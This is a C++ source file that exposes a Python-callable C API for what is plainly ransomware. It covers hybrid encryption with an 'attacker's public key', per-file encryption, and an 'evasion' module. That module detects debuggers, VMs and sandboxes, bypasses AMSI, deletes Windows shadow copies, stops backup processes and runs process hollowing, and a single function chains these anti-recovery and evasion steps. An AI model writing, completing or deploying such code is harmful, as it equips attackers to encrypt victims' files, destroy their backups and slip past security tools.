// moz_c_api.cpp - C API exports for ctypes/Python bridging
// Exposes MozCrypto and MozEvasion functionality via C-compatible interface

#include "moz_crypto.h"
#include "moz_evasion.h"

#include <string>
#include <vector>
#include <cstdint>
#include <cstring>

// Opaque handles for Python
typedef void* MozCryptoHandle;
typedef void* FileEncryptionHandle;

// ==================== Crypto API ====================

extern "C" {

// Create a new CryptoEngine with self-generated RSA key pair
MozCryptoHandle moz_crypto_create() {
    auto engine = new moz::CryptoEngine();
    engine->initialize({});
    return engine;
}

// Create with attacker's public key (encrypt-only mode)
MozCryptoHandle moz_crypto_create_with_pubkey(const uint8_t* pubkey_data, int pubkey_len) {
    auto engine = new moz::CryptoEngine();
    std::vector<uint8_t> pubkey(pubkey_data, pubkey_data + pubkey_len);
    engine->initialize(pubkey);
    return engine;
}

// Get public key DER bytes (returns size if buffer is null, or bytes copied)
int moz_crypto_get_pubkey(MozCryptoHandle handle, uint8_t* out_buffer, int buffer_size) {
    auto engine = static_cast<moz::CryptoEngine*>(handle);
    auto pubkey = engine->getPublicKeyDER();
    
    if (out_buffer == nullptr) {
        return static_cast<int>(pubkey.size());
    }
    
    if (buffer_size < static_cast<int>(pubkey.size())) {
        return -1;
    }
    
    memcpy(out_buffer, pubkey.data(), pubkey.size());
    return static_cast<int>(pubkey.size());
}

// Hybrid encrypt data (data -> blob bytes)
int moz_crypto_hybrid_encrypt(MozCryptoHandle handle, 
                               const uint8_t* data, int data_len,
                               uint8_t* out_blob, int blob_size) {
    auto engine = static_cast<moz::CryptoEngine*>(handle);
    
    std::vector<uint8_t> input(data, data + data_len);
    moz::EncryptedBlob blob;
    
    if (!engine->hybridEncrypt(input, blob)) {
        return -1;
    }
    
    auto serialized = blob.serialize();
    
    if (out_blob == nullptr) {
        return static_cast<int>(serialized.size());
    }
    
    if (blob_size < static_cast<int>(serialized.size())) {
        return -1;
    }
    
    memcpy(out_blob, serialized.data(), serialized.size());
    return static_cast<int>(serialized.size());
}

// Hybrid decrypt data (blob bytes -> data)
int moz_crypto_hybrid_decrypt(MozCryptoHandle handle,
                               const uint8_t* blob_data, int blob_len,
                               uint8_t* out_data, int data_size) {
    auto engine = static_cast<moz::CryptoEngine*>(handle);
    
    std::vector<uint8_t> blob_vec(blob_data, blob_data + blob_len);
    auto blob = moz::EncryptedBlob::deserialize(blob_vec);
    
    std::vector<uint8_t> decrypted;
    if (!engine->hybridDecrypt(blob, decrypted)) {
        return -1;
    }
    
    if (out_data == nullptr) {
        return static_cast<int>(decrypted.size());
    }
    
    if (data_size < static_cast<int>(decrypted.size())) {
        return -1;
    }
    
    memcpy(out_data, decrypted.data(), decrypted.size());
    return static_cast<int>(decrypted.size());
}

// Legacy encrypt (returns data as-is in this base implementation)
int moz_crypto_encrypt(MozCryptoHandle handle, 
                        const uint8_t* data, int data_len,
                        uint8_t* out_encrypted, int enc_size,
                        const char* key) {
    auto engine = static_cast<moz::CryptoEngine*>(handle);
    
    std::vector<uint8_t> input(data, data + data_len);
    std::vector<uint8_t> encrypted;
    
    if (!engine->encrypt(input, encrypted, std::string(key))) {
        return -1;
    }
    
    if (out_encrypted == nullptr) {
        return static_cast<int>(encrypted.size());
    }
    
    if (enc_size < static_cast<int>(encrypted.size())) {
        return -1;
    }
    
    memcpy(out_encrypted, encrypted.data(), encrypted.size());
    return static_cast<int>(encrypted.size());
}

// Legacy decrypt
int moz_crypto_decrypt(MozCryptoHandle handle,
                        const uint8_t* encrypted, int enc_len,
                        uint8_t* out_decrypted, int dec_size,
                        const char* key) {
    auto engine = static_cast<moz::CryptoEngine*>(handle);
    
    std::vector<uint8_t> input(encrypted, encrypted + enc_len);
    std::vector<uint8_t> decrypted;
    
    if (!engine->decrypt(input, decrypted, std::string(key))) {
        return -1;
    }
    
    if (out_decrypted == nullptr) {
        return static_cast<int>(decrypted.size());
    }
    
    if (dec_size < static_cast<int>(decrypted.size())) {
        return -1;
    }
    
    memcpy(out_decrypted, decrypted.data(), decrypted.size());
    return static_cast<int>(decrypted.size());
}

// Free crypto engine
void moz_crypto_free(MozCryptoHandle handle) {
    delete static_cast<moz::CryptoEngine*>(handle);
}

// ==================== File Encryption API ====================

// Create FileEncryption with engine
FileEncryptionHandle moz_file_enc_create_with_engine(MozCryptoHandle crypto_handle) {
    auto engine = static_cast<moz::CryptoEngine*>(crypto_handle);
    auto fe = new moz::FileEncryption();
    fe->setCryptoEngine(std::make_unique<moz::CryptoEngine>());
    return fe;
}

// Encrypt a single file
int moz_file_enc_encrypt_file(FileEncryptionHandle handle,
                               const char* input_path,
                               const char* output_path) {
    auto fe = static_cast<moz::FileEncryption*>(handle);
    return fe->encryptFile(input_path, output_path) ? 1 : 0;
}

// Decrypt a single file
int moz_file_enc_decrypt_file(FileEncryptionHandle handle,
                               const char* encrypted_path,
                               const char* output_path) {
    auto fe = static_cast<moz::FileEncryption*>(handle);
    return fe->decryptFile(encrypted_path, output_path) ? 1 : 0;
}

// Free file encryption handle
void moz_file_enc_free(FileEncryptionHandle handle) {
    delete static_cast<moz::FileEncryption*>(handle);
}

// ==================== Evasion API ====================

// Check if analysis environment is detected
int moz_evasion_is_analyzed() {
    return moz::AntiAnalysis::isBeingAnalyzed() ? 1 : 0;
}

// Check for debugger
int moz_evasion_is_debugger_present() {
    return moz::AntiAnalysis::isDebuggerPresent() ? 1 : 0;
}

// Check for VM
int moz_evasion_is_vm() {
    return moz::AntiAnalysis::isVirtualMachine() ? 1 : 0;
}

// Check if sandbox
int moz_evasion_is_sandbox() {
    return moz::AntiAnalysis::isSandbox() ? 1 : 0;
}

// Check if AMSI is active
int moz_evasion_amsi_active() {
    return moz::AMSIBypass::isAmsiActive() ? 1 : 0;
}

// Apply AMSI bypass
int moz_evasion_bypass_amsi() {
    bool p1 = moz::AMSIBypass::bypassAmsiPatching();
    bool p2 = moz::AMSIBypass::bypassClrUnhook();
    return (p1 || p2) ? 1 : 0;
}

// Delete shadow copies
int moz_evasion_delete_shadow_copies() {
    return moz::AntiRecovery::deleteShadowCopies() ? 1 : 0;
}

// Stop backup processes
int moz_evasion_stop_backup_processes() {
    return moz::AntiRecovery::stopBackupProcesses() ? 1 : 0;
}

// Check if process hollowing is available
int moz_evasion_hollowing_available() {
    return moz::ProcessHollowing::isAvailable() ? 1 : 0;
}

// Execute via process hollowing (simplified - uses target process name)
int moz_evasion_hollowing_execute(const char* target_process) {
    uint32_t pid = moz::ProcessHollowing::executeViaHollowing(
        std::vector<uint8_t>(), target_process);
    return static_cast<int>(pid);
}

// Run full evasion sequence
int moz_evasion_run_all() {
    // Anti-analysis (continue regardless)
    moz::AntiAnalysis::isBeingAnalyzed();
    
    // Stop backup processes
    moz::AntiRecovery::stopBackupProcesses();
    
    // Delete shadow copies
    moz::AntiRecovery::deleteShadowCopies();
    
    // AMSI bypass
    moz::AMSIBypass::bypassAmsiPatching();
    moz::AMSIBypass::bypassClrUnhook();
    
    return 1;
}

} // extern "C"
